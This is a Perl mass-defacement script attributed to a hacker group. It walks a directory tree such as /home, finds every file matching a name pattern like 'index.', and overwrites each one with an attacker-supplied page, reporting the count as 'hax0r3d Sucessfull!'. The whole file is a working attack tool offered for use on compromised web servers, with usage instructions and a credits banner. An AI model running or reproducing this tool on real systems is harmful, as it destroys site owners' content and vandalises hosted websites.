#!/usr/local/bin/perl
################################## ABOUT ###################################################
$VERSION="Version 0.1 by LorD";
$about =
"\n\ejust for sniper hacker\n".
"\ejoker_mtv[at]yahoo.com\n".
"\esniper-sa.com\n".
"\e\n".
"\eperl mass.pl -d /home -f index. -n /way/index.html\n".
"\e\n".
"\e[/way/index.html] is yous index place \n".
"\e\n".
"\e\n".
"\ethanks for all sniper admin and members\n".
"\eyour brother joker\n";
############################################################################################
use Getopt::Std;
getopts('d:f:n:', \%args);
if (defined($args{'d'})){$dir=$args{'d'};}else{$dir="";}
if (defined($args{'f'})){$file=$args{'f'};}else{$file="";}
if (defined($args{'n'})){$newfile=$args{'n'};}else{$newfile="";}

print $about;

$dirok="\e[33m[+]\e[m Ok, Diretory that wanna be Massdeface: \e[32m$dir\e[m";
$fileok="\e[33m[+]\e[m Ok, O file name for attack: \e[32m$file\e[m";
$newfileok="\e[33m[+]\e[m Ok, location of attacker index file: \e[32m$newfile\e[m";

if("$dir") {
 print "$dirok\n";
sleep(1);
} else {
exit();
}
if("$file") {
 print "$fileok\n";
sleep(1);
}
else
{
 print "";
exit();
}
if("$newfile") {
 print "$newfileok\n";
sleep(1);
}
else
{
 print "";
exit();
}

printf "\e[33m[+]\e[m Start Defacing......\n";
my @troca;
find($dir, sub { push(@troca, $_[0]) if ($_[0] =~ /$file/i) });
my $quantidade = scalar(@troca);

if($quantidade<=0) {
print "\e[31m[-]\e[m Erro: Nenhum Arquivo encontrado.\n";sleep(1);
print "\e[31m[-]\e[m Coloque a extencao do arquivo.\n";sleep(1);
print "\e[31m[-]\e[m Ou, Apenas arquivo. [Sem extencao].\n";sleep(1);
exit();
}

printf "\e[33m[+]\e[m Ok, found: \e[32m$quantidade\e[m files...\n";sleep(1);
printf "\e[33m[+]\e[m Defacing index files.\n";
open(NEW, "< $newfile");
foreach $files(@troca)
{
open(FILE, "> $files");
while (<NEW>) {
print FILE $_;
}
close(FILE);
seek(NEW, 0, 0);
}
close(NEW);
sleep(1);
printf "\e[33m[+]\e[m hax0r3d Sucessfull!\n";sleep(1);
printf "\e[33m[+]\e[m Total files that defaced: \e[32m$quantidade\e[m\n";
sub find {
  my ($path, $callback) = @_;
  $path = '/' unless $path;
  $path =~ s/^\/+/\//;
  $path =~ s/\/$//;
  my @files = list_dir($path);
  my @dirs;
  foreach my $file (@files) {
    my $filepath = $path.'/'.$file;
    &{$callback}($filepath);
    push(@dirs, $filepath) if (-d $filepath);
  }
  undef(@files);
  map { find($_, $callback) } @dirs;
  return(1);
}
sub list_dir {
   my ($dir, $dont_list_subdirs) = @_;
   opendir(DIR, $dir) || return();
   my @files = readdir(DIR);
   closedir(DIR);
   @files = grep { !-d "$dir/$_" } @files if ($dont_list_subdirs);
   my @files = grep { $_ !~ /^(\.){1,2}$/ } @files;
   return(@files);
}
